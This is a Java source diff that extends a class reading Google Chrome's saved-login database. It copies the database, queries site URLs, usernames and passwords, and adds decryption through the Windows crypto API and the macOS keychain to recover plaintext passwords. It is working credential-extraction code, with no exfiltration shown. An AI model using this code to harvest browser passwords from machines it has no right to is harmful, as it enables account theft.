@@ -4,6 +4,7 @@ import java.io.File;
 import java.io.FileOutputStream;
 import java.io.IOException;
 import java.nio.file.Files;
+import java.nio.file.Path;
 import java.nio.file.Paths;
 import java.sql.Connection;
 import java.sql.ResultSet;
@@ -12,6 +13,9 @@ import java.util.ArrayList;
 
 import me.matt.chrome.acc.exception.DatabaseConnectionException;
 import me.matt.chrome.acc.exception.DatabaseReadException;
+import me.matt.chrome.acc.exception.UnsupportedOperatingSystemException;
+import me.matt.chrome.acc.util.ChromeSecurity;
+import me.matt.chrome.acc.util.OperatingSystem;
 
 import org.sqlite.SQLiteConfig;
 import org.sqlite.SQLiteConfig.TransactionMode;
@@ -19,23 +23,21 @@ import org.sqlite.SQLiteConfig.TransactionMode;
 public class ChromeDatabase {
 
     private Connection connection;
-    private File database;
 
-    private ChromeDatabase(Connection connection, File database) {
+    private ChromeDatabase(Connection connection) {
         this.connection = connection;
-        this.database = database;
     }
 
     public static ChromeDatabase connect(File database)
             throws DatabaseConnectionException {
 
-        File tempDB = new File(database.getAbsolutePath() + "_TEMP");
+        Path tempDB;
         try {
-            if (!tempDB.exists()) {
-                tempDB.createNewFile();
-            }
-            Files.copy(Paths.get(database.getPath()), new FileOutputStream(
-                    tempDB));
+            tempDB = Files.createTempFile("CHROME_LOGIN_", null);
+            FileOutputStream out = new FileOutputStream(tempDB.toFile());
+            Files.copy(Paths.get(database.getPath()), out);
+            out.close();
+            tempDB.toFile().deleteOnExit();
         } catch (IOException e) {
             throw new DatabaseConnectionException(
                     "Error copying database! Has chrome updated?");
@@ -46,19 +48,19 @@ public class ChromeDatabase {
             config.setReadOnly(true);
 
             config.setTransactionMode(TransactionMode.EXCLUSIVE);
-            db = config.createConnection("jdbc:sqlite:" + tempDB.getPath());
+            db = config.createConnection("jdbc:sqlite:" + tempDB.toString());
             db.setAutoCommit(true);
         } catch (SQLException e) {
-            tempDB.delete();
             // TODO: Better handling of connection
             throw new DatabaseConnectionException(
                     "Error connecting to database! Has chrome updated?");
         }
-        return new ChromeDatabase(db, tempDB);
+        return new ChromeDatabase(db);
     }
 
     public ArrayList<ChromeAccount> selectAccounts()
-            throws DatabaseConnectionException, DatabaseReadException {
+            throws DatabaseConnectionException, DatabaseReadException,
+            UnsupportedOperatingSystemException {
         try {
             if (connection.isClosed()) {
                 throw new DatabaseConnectionException(
@@ -75,12 +77,24 @@ public class ChromeDatabase {
                     .executeQuery(
                             "SELECT action_url, username_value, password_value FROM logins");
             while (results.next()) {
-                String address, username;
-                byte[] password;
+                String address, username, password;
                 try {
                     address = results.getString("action_url");
                     username = results.getString("username_value");
-                    password = results.getBytes("password_value"); // TODO: Null on mac??
+                    switch (OperatingSystem.getOperatingsystem()) {
+                        case WINDOWS:
+                            password = ChromeSecurity.getWin32Password(results
+                                    .getBytes("password_value"));
+                            break;
+                        case MAC:
+                            password = ChromeSecurity
+                                    .getOSXKeychainPassword(address);
+                            break;
+                        default:
+                            throw new UnsupportedOperatingSystemException(
+                                    System.getProperty("os.name")
+                                            + " is not supported by this application!");
+                    }
                     accounts.add(new ChromeAccount(username, password, address));
                 } catch (SQLException e) {
                     e.printStackTrace();
@@ -98,7 +112,6 @@ public class ChromeDatabase {
     }
 
     public void close() {
-        database.delete();
         try {
             connection.close();
         } catch (SQLException e) {
